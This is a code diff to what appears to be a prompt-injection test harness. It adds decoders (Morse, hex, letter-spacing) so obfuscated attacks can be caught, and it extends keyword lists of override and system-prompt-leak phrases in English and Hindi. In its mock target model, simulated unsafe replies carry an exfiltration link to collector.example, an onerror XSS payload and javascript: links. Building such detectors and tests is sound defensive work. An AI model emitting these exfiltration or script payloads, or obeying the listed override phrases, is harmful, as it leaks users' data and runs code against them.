@@ -31,7 +31,45 @@ _HOMOGLYPHS = str.maketrans({
     "х": "x", "у": "y", "і": "i", "ѕ": "s", "ԁ": "d",
 })
 _B64_RE = re.compile(r"[A-Za-z0-9+/]{24,}={0,2}")
+_HEX_RE = re.compile(r"\b[0-9a-fA-F]{40,}\b")
 _TOOL_DEF_RE = re.compile(r"\b([a-z][a-z0-9_]{2,})\s*\(")
+_MORSE_REV = {
+    ".-": "a", "-...": "b", "-.-.": "c", "-..": "d", ".": "e", "..-.": "f",
+    "--.": "g", "....": "h", "..": "i", ".---": "j", "-.-": "k", ".-..": "l",
+    "--": "m", "-.": "n", "---": "o", ".--.": "p", "--.-": "q", ".-.": "r",
+    "...": "s", "-": "t", "..-": "u", "...-": "v", ".--": "w", "-..-": "x",
+    "-.--": "y", "--..": "z", "-----": "0", ".----": "1", "..---": "2",
+    "...--": "3", "....-": "4", ".....": "5", "-....": "6", "--...": "7",
+    "---..": "8", "----.": "9", "-....-": "-", ".-.-.-": ".",
+    "--..--": ",",
+}
+_MORSE_RUN_RE = re.compile(r"[.\-]+(?: [.\-]+)+(?: / [.\-]+(?: [.\-]+)*)*")
+
+
+def _morse_decode(text: str) -> str:
+    out = []
+    for run in _MORSE_RUN_RE.findall(text):
+        words = []
+        for word in run.split(" / "):
+            letters = [_MORSE_REV.get(tok, "") for tok in word.split(" ")]
+            words.append("".join(letters))
+        decoded = " ".join(w for w in words if w)
+        if len(decoded) >= 4:
+            out.append(decoded)
+    return "\n".join(out)
+
+
+def _despace(text: str) -> str:
+    """Collapse letter-spaced text (one space between every character)."""
+    parts = re.split(r"\s{2,}", text)
+    out = []
+    for part in parts:
+        tokens = part.split(" ")
+        if len(tokens) >= 4 and all(len(t) <= 1 for t in tokens if t):
+            out.append("".join(tokens))
+        else:
+            out.append(part)
+    return " ".join(out)
 
 _LEAK_KEYWORDS = (
     "system prompt", "your instructions", "initial instructions",
@@ -39,12 +77,15 @@ _LEAK_KEYWORDS = (
     "repeat everything", "repeat the text", "repeat your", "verbatim",
     "debug mode", "what were you told", "customer record", "record token",
     "confidential", "internal notes", "above text", "your prompt",
+    "सिस्टम प्रॉम्प्ट", "कोडनेम", "batao", "bata do", "bataiye",
 )
 _MARKER_VERBS = (
     "say", "print", "output", "repeat", "write", "reply with",
     "respond with", "tell me", "reveal", "spell", "translate", "decode",
     "encode", "reverse", "give me", "give", "provide", "show me", "state",
-    "confirm", "append", "end with", "end your",
+    "confirm", "append", "end with", "end your", "quote", "cite",
+    "बताओ", "बताइए", "प्रिंट", "लिखो", "batao", "bataiye", "likho",
+    "print karo",
 )
 _ATTACK_KEYWORDS = _LEAK_KEYWORDS + (
     "ignore previous", "ignore all", "disregard", "override", "jailbreak",
@@ -83,11 +124,21 @@ def analysis_view(text: str) -> str:
     except Exception:
         pass
     views.append(plain[::-1])
+    views.append(_despace(plain))
+    morse = _morse_decode(plain)
+    if morse:
+        views.append(morse)
     for blob in _B64_RE.findall(plain):
         try:
             views.append(base64.b64decode(blob).decode("utf-8", "replace"))
         except Exception:
             pass
+    for blob in _HEX_RE.findall(plain):
+        if len(blob) % 2 == 0:
+            try:
+                views.append(bytes.fromhex(blob).decode("utf-8", "replace"))
+            except Exception:
+                pass
     return "\n".join(views).lower()
 
 
@@ -150,6 +201,14 @@ class MockTarget:
 
         # 2. Unsafe output: emit raw markup / exfil constructs on request.
         if can.marker.lower() in view:
+            if "reference" in view and "link" in view:
+                return ("[status][1]\n\n[1]: https://collector.example/x?d="
+                        + can.marker)
+            if "entit" in view:
+                return ("&lt;img src=x onerror=&quot;alert('" + can.marker
+                        + "')&quot;&gt;")
+            if "comment" in view:
+                return "<!-- " + can.marker + " -->"
             if "javascript:" in view:
                 return ("<a href=\"javascript:alert('" + can.marker
                         + "')\">click here</a>")
